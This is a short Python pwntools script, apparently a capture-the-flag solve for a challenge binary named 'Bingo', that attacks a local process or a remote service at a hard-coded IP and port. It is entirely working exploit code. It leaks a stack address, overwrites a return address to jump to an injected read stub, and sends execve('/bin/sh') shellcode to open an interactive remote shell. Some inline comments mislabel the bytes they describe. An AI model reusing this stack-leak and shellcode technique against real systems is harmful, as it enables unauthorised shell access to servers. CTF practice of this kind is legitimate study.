from pwn import *
import sys


Host = '35.201.132.60'
Port = 12001

if len(sys.argv) == 1:
    r = process('./Bingo')#, env={'LD_PRELOAD': ''})
else:
    r = remote(Host, Port)

nums = [183,86,177,115,193,135,186,92,49,21,162,27,90,59,163,126]
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.recvuntil('numbers:')


for i in xrange(16):
    if i == 15:
        r.send('++++')
    else:
        r.sendline(str(nums[i]))

r.recvuntil('++++')
stack = u64(r.recvuntil('\n').strip()[0:6].ljust(8,'\x00'))
log.info('stack: ' + hex(stack))

payload = 'A'
payload += '\xb2\x24' # mov dl, 0x2f
payload += '\x48\x83\xee\x09' # sub rsi, 0xd
payload += '\x0f\x05' # syscall
payload = payload.ljust(0xc, 'A')
payload += p64(stack-0x13)
raw_input('#')
r.send(payload[:-1])

sleep(0.5)
r.send(shellcode)

r.interactive()

